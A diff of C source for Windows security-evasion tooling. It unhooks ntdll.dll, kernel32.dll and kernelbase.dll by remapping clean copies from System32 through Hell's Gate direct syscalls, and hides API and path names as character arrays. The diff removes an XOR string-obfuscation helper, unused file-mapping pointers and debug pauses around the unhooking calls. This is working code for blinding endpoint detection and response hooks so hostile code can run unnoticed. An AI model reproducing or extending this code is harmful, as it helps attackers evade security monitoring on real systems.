@@ -7,23 +7,9 @@ unsigned char sKernel32[] = { 'k','e','r','n','e','l','3','2','.','d','l','l', 0
 unsigned char sKernelBaseDll[] = { 'k','e','r','n','e','l','b','a','s','e','.','d','l','l', 0x0 };
 
 VirtualProtect_t VirtualProtect_p = NULL;
-CreateFileMappingA_t CreateFileMappingA_p = NULL;
-MapViewOfFile_t MapViewOfFile_p = NULL;
+
 UnmapViewOfFile_t UnmapViewOfFile_p = NULL;
 RtlInitUnicodeString_t RtlInitUnicodeString_p = NULL;
-
-char* XORcrypt(char str2xor[], size_t len, char key) {
-	/*
-			XORcrypt() is a simple XOR encoding/decoding function
-	*/
-	int i;
-
-	for (i = 0; i < len; i++) {
-		str2xor[i] = (BYTE)str2xor[i] ^ key;
-	}
-	return str2xor;
-}
-
 
 static int UnhookNtdll(const HMODULE hNtdll, const LPVOID pMapping) {
 	/*
@@ -105,6 +91,7 @@ BOOL unHookLibrary(WCHAR sNtdllPath[], unsigned char sdll[], PVX_TABLE table) {
 	PHANDLE sectionBaseAddress = NULL;
 	HellsGate(table->NtMapViewOfSection.wSystemCall);
 	SIZE_T size = 0;
+	
 	status = HellDescent(sectionHandle, NtCurrentProcess(), &sectionBaseAddress, NULL, NULL, NULL, &size, 1, NULL, PAGE_EXECUTE_WRITECOPY);
 	if (status != 0 && status != STATUS_IMAGE_NOT_AT_BASE) {
 		//printf("[-] NtMapViewOfSection error: %X\n", status);
@@ -133,8 +120,7 @@ void UnhookingMainFunction(PVX_TABLE table) {
 	int pid = 0;
 	HANDLE hProc = NULL;
 
-	unsigned char sCreateFileMappingA[] = { 'C','r','e','a','t','e','F','i','l','e','M','a','p','p','i','n','g','A', 0x0 };
-	unsigned char sMapViewOfFile[] = { 'M','a','p','V','i','e','w','O','f','F','i','l','e',0x0 };
+
 	unsigned char sUnmapViewOfFile[] = { 'U','n','m','a','p','V','i','e','w','O','f','F','i','l','e', 0x0 };
 	unsigned char sVirtualProtect[] = { 'V','i','r','t','u','a','l','P','r','o','t','e','c','t', 0x0 };
 
@@ -147,12 +133,9 @@ void UnhookingMainFunction(PVX_TABLE table) {
 	WCHAR sKBase[] = { '\\','?','?','\\','C',':','\\','w','i','n','d','o','w','s','\\','s','y','s','t','e','m','3','2','\\','k', 'e', 'r', 'n', 'e', 'l', 'b', 'a', 's', 'e', '.', 'd', 'l', 'l', 0x0 };
 	WCHAR sK32Path[] = { '\\','?','?','\\','C',':','\\','W','i','n','d','o','w','s','\\','S','y','s','t','e','m','3','2','\\','k','e','r','n','e','l','3','2','.','d','l','l', 0x0 };
 	WCHAR sNtdllPath[] = { '\\','?','?','\\','C',':','\\','W','i','n','d','o','w','s','\\','S','y','s','t','e','m','3','2','\\','N','t','d','l','l','.','d','l','l', 0x0 };
-	// open ntdll.dll
-	printf("before unhooking\n");
-	getchar();
+
+
 	unHookLibrary(sNtdllPath, sNtdll, table);
-	printf("after unhooking\n");
-	getchar();
 	unHookLibrary(sK32Path,  sKernel32, table);
 	unHookLibrary(sKBase, sKernelBaseDll, table);
 
